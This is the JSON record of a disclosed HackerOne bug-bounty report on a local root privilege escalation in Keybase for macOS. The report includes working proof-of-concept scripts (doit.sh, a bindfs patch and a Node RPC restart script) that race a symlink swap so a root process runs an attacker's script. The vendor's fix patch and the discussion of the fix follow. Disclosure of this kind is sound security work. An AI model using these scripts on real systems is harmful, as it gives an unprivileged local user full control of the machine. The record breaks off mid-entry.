{"id":470398,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzAzOTg=","url":"https://hackerone.com/reports/470398","title":"Local privilege escalation bug using Keybase redirector on macOS","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-12-20T21:33:40.369Z","submitted_at":"2018-12-20T21:33:40.369Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"votava","url":"/votava","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2809,"url":"https://hackerone.com/keybase","handle":"keybase","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Keybase","twitter_handle":"keybaseio","website":"https://keybase.io","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-01-30T18:15:40.373Z","bug_reporter_agreed_on_going_public_at":"2019-01-30T18:15:40.305Z","team_member_agreed_on_going_public_at":"2019-01-30T18:13:26.802Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"There's a local privilege escalation bug in the latest version of Keybase for\nmacOS.\n\nThe issue is in the process of launching `keybase-redirector`. The process works as follows:\n\n1. Copy `keybase-redirector` binary to a root-only location\n2. Check its signature\n3. Launch the binary\n\n[Code ref](https://github.com/keybase/client/blob/37b894b8e2a2b6cf023516900ef2ee9c058ca65f/osx/Helper/KBHelper.m#L213-L236).\n\nNote the following:\n\n1. There's a window between point 2. and 3. When the window is opened, the\n   binary is referenced using just its path.\n2. The `keybase-redirector` can be a symlink pointing to an arbitrary location\n   from the privileged location.\n\nThe goal is to replace the real binary with a symlink which will first point to\nthe real binary (for the signature verification process) and then updated to\npoint to an evil binary/script for the launch.\n\nThe window is tiny and thus reproducing this is a bit tricky. One can do it in\nmany ways but the most complicated (while being the most fragile one at the\nsame time!) is as follows:\n\n### 1. Install Keybase including the Finder integration\n### 2. Build and install bindfs with the following patch:\n\n```\ndiff --git a/src/bindfs.c b/src/bindfs.c\nindex baacb82..b80e396 100644\n--- a/src/bindfs.c\n+++ b/src/bindfs.c\n@@ -1090,6 +1090,7 @@ static int bindfs_open(const char *path, struct fuse_file_info *fi)\n static int bindfs_read(const char *path, char *buf, size_t size, off_t offset,\n                        struct fuse_file_info *fi)\n {\n+    static int counter = 0;\n     int res;\n     (void) path;\n\n@@ -1101,6 +1102,9 @@ static int bindfs_read(const char *path, char *buf, size_t size, off_t offset,\n     if (res == -1)\n         res = -errno;\n\n+    printf(\"%i\\n\", counter++);\n+    fflush(stdout);\n+\n     return res;\n }\n```\n\n### 3. Run `doit.sh`.\nIt will first create a few symlinks. This will allow the switch between the original binary and the evil one. It will then force a restart of `keybase-redirector` (by uninstalling it and installing it again). Finally, it will start bindfs, watch out for \"502\" and switch the symlinks.\n\n#### doit.sh\n```\n#!/bin/sh\n\ntest -L /Applications/Keybase.app/Contents/SharedSupport/bin/keybase-redirector || cp /Applications/Keybase.app/Contents/SharedSupport/bin/keybase-redirector ~/exploit/keybase-redirector.orig\n\nmkdir -p ~/switcher\nln -sf ~/switcher/switch /Applications/Keybase.app/Contents/SharedSupport/bin/keybase-redirector\nln -sf ~/switcher/keybase-redirector.orig ~/exploit/switch\n\n(node restart-kbhelper/index.js \u0026\u0026 ls -l /pwned.txt) \u0026\n\nbindfs -f ~/exploit ~/switcher | while read line\ndo\n  [[ $line == \"502\" ]] \u0026\u0026 ln -sf ~/switcher/evil.sh ~/switcher/switch\ndone\n```\n\n#### evil.sh\n```\n#!/bin/sh\n\ntouch /pwned.txt\n```\n\nThe restart is done using the MessagePack RPC using Node.js but you can do it\nin another way, it's just we had this laying around. The number 502 is a\ncount of read requests for the FUSE file system. As you can imagine it's\npretty fragile, but again, we were using bindfs anyway and this worked.\n\n#### restart-kbhelper/index.js\n```js\nconst homedir = require(\"os\").homedir();\nconst rpc = require(\"framed-msgpack-rpc\");\nconst socket = `${homedir}/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock`;\n\nconst x = rpc.createTransport({ path: socket });\nfunction restart() {\n    x.connect(() =\u003e {\n        const c = new rpc.Client(x, \"keybase.1.install\");\n        c.invoke('uninstallKBFS', [{}], () =\u003e {\n            c.invoke('installKBFS', [{}], (err, response) =\u003e {\n                console.log(JSON.stringify(response, 0, 2));\n                x.close();\n            });\n        });\n    });\n}\n\nrestart();\n```\n\n\nA similar but better solution would be to simply write a custom read FUSE hook\nand return a different file once the original is read in the verification\nprocess. But again, the previous quick \u0026 dirty solution worked so why bother.\n\nWe recorded a video showing it in action (attached). Note that this was joint\neffort by Jan Votava (https://twitter.com/elektronek) and Jiri Pospisil (https://twitter.com/jiripospisil) from https://sensible.io.\n\n## Impact\n\nA local user is able to run an arbitrary binary/script with root privileges leading to a total system compromise.","bounty_amount":"2500.0","formatted_bounty":"$2,500","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":395276,"file_name":"pwned.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/395/276/4b5f873f381e73c74edc9c15c06758556ddfc5fc/pwned.mp4?response-content-disposition=attachment%3B%20filename%3D%22pwned.mp4%22%3B%20filename%2A%3DUTF-8%27%27pwned.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150308Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=53e686f13788111f738499327913a64e23e3a8b7a281ca0eb7ff67ce4f6ab9bc","file_size":4726516,"type":"video/mp4"},{"id":395277,"file_name":"exploit.tar","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/395/277/e9aa5f5b2b1be5d9aa2b4571b3d8f71ad1ee4eb7/exploit.tar?response-content-disposition=attachment%3B%20filename%3D%22exploit.tar%22%3B%20filename%2A%3DUTF-8%27%27exploit.tar\u0026response-content-type=application%2Fx-tar\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150308Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ba007b2afb2067a73b6766a524a57145abc7bc8f1d49c2859c4b2464112dbcf4","file_size":10240,"type":"application/x-tar"}],"allow_singular_disclosure_at":null,"vote_count":23,"voters":["mirchr","sp1d3rs","dxaxpanda","bl4de","spam404","dhakal_ananda","ali","protesen","kunal94","khizer47","and 13 more..."],"severity":{"rating":"high","score":7.8,"author_type":"User","metrics":{"attack_vector":"local","attack_complexity":"high","privileges_required":"low","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3873619,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the report, we'll look into it ASAP.","automated_response":false,"created_at":"2018-12-20T23:09:49.416Z","updated_at":"2018-12-20T23:09:49.416Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3873623,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We took a quick glance, if it turns out to be an issue (which we're assuming at this point it is), do you think it's sufficient fix to add a step 1.5 to check that the target isn't a symlink?","automated_response":false,"created_at":"2018-12-20T23:11:09.810Z","updated_at":"2018-12-20T23:11:09.810Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3874349,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, checking that the file is `NSFileTypeRegular` should prevent this attack vector.","automated_response":false,"created_at":"2018-12-21T07:17:32.101Z","updated_at":"2018-12-21T07:17:32.101Z","actor":{"username":"votava","cleared":false,"url":"/votava","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3874389,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's a link to `bindfs` project we're using to detect that the file was read https://github.com/mpartel/bindfs (patch is included in the report). Also please don't forget to install npm modules (`npm install`) in `restart-kbhelper/` folder. If you need help with reproducing that vulnerability do not hesitate to contact us.","automated_response":false,"created_at":"2018-12-21T07:34:57.210Z","updated_at":"2018-12-21T07:35:58.410Z","actor":{"username":"votava","cleared":false,"url":"/votava","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3877187,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2018-12-21T17:15:29.460Z","updated_at":"2018-12-21T17:15:29.460Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3880015,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We have a fix, can you take a look?  I've also included the patch.\n\nNew DMG: https://s3.amazonaws.com/prerelease.keybase.io/darwin/Keybase-2.13.1-20181221191618%2Bb4a1bca.dmg\n\nThank you!","automated_response":false,"created_at":"2018-12-22T01:16:56.019Z","updated_at":"2018-12-22T01:16:56.019Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":395831,"filename":"0001-osx-check-a-copied-binary-isn-t-actually-a-symlink.patch","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/395/831/f287d6d39af111cc07ed2ae8cef7eedc4b2838dc/0001-osx-check-a-copied-binary-isn-t-actually-a-symlink.patch?response-content-disposition=attachment%3B%20filename%3D%220001-osx-check-a-copied-binary-isn-t-actually-a-symlink.patch%22%3B%20filename%2A%3DUTF-8%27%270001-osx-check-a-copied-binary-isn-t-actually-a-symlink.patch\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150309Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2351cd20d68ed5d22b680bbef779ea2483b955ddef47478b4eff9431af309930"}],"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3880282,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey Max,\n\nI reviewed the patch and it looks good to me. Problem is fixed now and I'm no longer able to obtain root.\n\nBest, Jan\n\n#### doit.sh\n\n```\n...\n  \"fatal\": false,\n  \"status\": {\n    \"code\": 1804,\n    \"desc\": \"exit status 1 (redirector)\",\n    \"fields\": null,\n    \"name\": \"ERROR\"\n  }\n}\nls: /pwned.txt: No such file or directory\n```\n\n#### ~/Library/Logs/keybase.service.log\n\n```\n...\n12.22.2018 05:56:54.212 KBInstaller:45[INFO] Install complete\n12.22.2018 05:56:54.212 KBInstaller:49[INFO] Privileged Helper: Installed, Bundle Version: 1.0.33\nVersion: 1.0.33\n12.22.2018 05:56:54.212 KBInstaller:49[INFO] Redirector: Install Error: Redirector must not be a symlink\n12.22.2018 05:56:54.212 Installer:96[INFO] Exit(1)\n2018-12-22T05:56:54.216777+01:00 â–¶ [ERRO keybase install_darwin.go:604] 1199 Error starting redirector: exit status 1\n```","automated_response":false,"created_at":"2018-12-22T05:05:11.558Z","updated_at":"2018-12-22T05:05:11.558Z","actor":{"username":"votava","cleared":false,"url":"/votava","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3881125,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Still, while the current fix works against this particular technique, we think it would be better to take a more defensive approach and check that the path indeed leads to a regular file, not just that it's not a symlink. Though we've tried with other file types but we cannot think of any other working variant that could be misused as of right now.","automated_response":false,"created_at":"2018-12-22T12:15:26.898Z","updated_at":"2018-12-22T12:15:26.898Z","actor":{"username":"votava","cleared":false,"url":"/votava","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3900104,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"That you for your great work here.  We have patched the hole and have a release candidate with the fix. In the end, we took the more restrictive approach that you recommend above:\n\nhttps://s3.amazonaws.com/prerelease.keybase.io/darwin-test/Keybase-2.12.4-20181227202844%2Bf616a46.dmg","automated_response":false,"created_at":"2018-12-28T12:32:18.061Z","updated_at":"2018-12-28T12:32:18.061Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3900121,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"```\nFrom 541cb255867580972b0cf736e201129ba19eb7d2 Mon Sep 17 00:00:00 2001\nFrom: Maxwell Krohn \u003cthemax@gmail.com\u003e\nDate: Sat, 22 Dec 2018 18:21:02 -0500\nSubject: [PATCH 1/9] slightly safer\n\n---\n osx/Helper/KBHelper.m | 13 +++++++++++--\n 1 file changed, 11 insertions(+), 2 deletions(-)\n\ndiff --git a/osx/Helper/KBHelper.m b/osx/Helper/KBHelper.m\nindex afce1943f..fd2ca6778 100644\n--- a/osx/Helper/KBHelper.m\n+++ b/osx/Helper/KBHelper.m\n@@ -163,8 +163,8 @@ - (NSURL *)copyBinaryForHelperUse:(NSString *)bin name:(NSString *)name error:(N\n     // symlink, since then a non-root user could change the binary\n     // after we check the signature.\n     NSString *dstPath = [dstURL path];\n-    if ([self linkExists:dstPath]) {\n-        *error = KBMakeError(-1, @\"Redirector must not be a symlink\");\n+    if (![self isRegularFile:dstPath]) {\n+        *error = KBMakeError(-1, @\"Redirector must be a regular file\");\n         return nil;\n     }\n \n@@ -269,6 +269,15 @@ - (BOOL)linkExists:(NSString *)linkPath {\n   return [attributes[NSFileType] isEqual:NSFileTypeSymbolicLink];\n }\n \n+- (BOOL)isRegularFile:(NSString *)linkPath {\n+  NSDictionary *attributes = [NSFileManager.defaultManager attributesOfItemAtPath:linkPath error:nil];\n+  if (!attributes) {\n+    return NO;\n+  }\n+  return [attributes[NSFileType] isEqual:NSFileTypeRegular];\n+}\n+\n+\n - (NSString *)resolveLinkPath:(NSString *)linkPath {\n   if (![self linkExists:linkPath]) {\n     return nil;\n-- \n2.17.1 (Apple Git-112)\n```\n","automated_response":false,"created_at":"2018-12-28T12:35:12.809Z","updated_at":"2018-12-28T12:35:12.809Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3900132,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2018-12-28T12:36:02.381Z","updated_at":"2018-12-28T12:36:02.381Z","additional_data":{"duplicate_report_id":471629},"actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/8shgv1i94snku36hm70ncflgl95o/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22tw-pic.jpeg%22%3B%20filename%2A%3DUTF-8%27%27tw-pic.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150309Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=783dbddf7679f261bbcac46e58789ca66ba15e62af8eaf972c192a91d4c6a792"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3906659,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Looks fine (we noticed the PR on GitHub). Please let us know when you're ready to disclose this.","automated_response":false,"created_at":"2018-12-30T15:49:40.926Z","updated_at":"2018-12-30T15:49:40.926Z","actor":{"username":"votava","cleared":false,"url":"/votava","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3932716,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, thanks again for this great bug report and and your research. Our current plan is to bounty and disclose this issue after our next release cycle (2.13.0), later this month. In the mean time, we're reaching out to all users who haven't upgraded to 2.12.6 yet and encouraging them to upgrade. We'll be in touch shortly.","automated_response":false,"created_at":"2019-01-07T01:07:14.495Z","updated_at":"2019-01-07T01:07:14.495Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066212,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2019-01-30T18:12:54.867Z","updated_at":"2019-01-30T18:12:54.867Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"votava","url":"/votava"},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066216,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2019-01-30T18:13:16.497Z","updated_at":"2019-01-30T18:13:16.497Z","actor":{"url":"